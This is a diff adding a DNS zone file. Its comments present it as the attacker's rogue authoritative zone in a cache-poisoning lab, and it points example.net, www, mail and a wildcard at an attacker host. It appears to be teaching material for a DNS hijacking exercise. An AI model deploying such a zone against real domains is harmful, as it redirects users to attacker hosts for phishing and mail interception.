@@ -1,0 +1,19 @@
+$TTL 3D
+; Rogue authoritative zone for example.net served by the attacker's
+; name server (ns.attacker32.com / 10.9.0.153).
+; After the cache-poisoning attack injects "example.net NS ns.attacker32.com",
+; the victim resolver sends ALL future example.net lookups here, so every
+; name under the hijacked domain resolves to an attacker-controlled host.
+@       IN      SOA   ns.attacker32.com. admin.attacker32.com. (
+                2025101101  ; Serial
+                8H          ; Refresh
+                2H          ; Retry
+                4W          ; Expire
+                1D)         ; Minimum TTL
+
+@       IN      NS    ns.attacker32.com.
+
+@       IN      A     192.168.0.100        ; example.net
+www     IN      A     192.168.0.100        ; www.example.net -> attacker host
+mail    IN      A     192.168.0.100        ; mail.example.net -> attacker host
+*       IN      A     192.168.0.100        ; everything else -> attacker host
